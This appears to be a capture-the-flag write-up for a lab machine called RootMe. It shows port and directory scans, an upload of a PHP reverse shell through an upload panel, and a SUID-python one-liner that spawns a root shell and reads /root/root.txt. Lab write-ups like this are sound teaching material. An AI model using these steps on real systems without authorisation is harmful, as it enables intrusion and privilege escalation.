# RootMe

Very easy CTF, but the machine was very slow for me, I don't know why.


```bash
$ nmap -p- $IP | tee open_ports

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-25 23:17 UTC
Nmap scan report for 10.10.177.174
Host is up (0.075s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 60.90 seconds
```

```bash
$ nmap -p22,80 -sV -sC 10.10.177.174 | tee nmap_scan
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-25 23:29 UTC
Nmap scan report for 10.10.177.174
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
```

```bash
$ gobuster dir -u http://10.10.177.174/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster_scan
```

Gobuster finds 2 hidden dirs, /panel and /uploads

Panel lets us upload a file and /uploads lets us view the uploaded file

Upload a reverse PHP shell

Find that python is SUID

Exploit it (https://gtfobins.github.io/gtfobins/python/)[https://gtfobins.github.io/gtfobins/python/].

```bash
$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ cat /root/root.txt
```


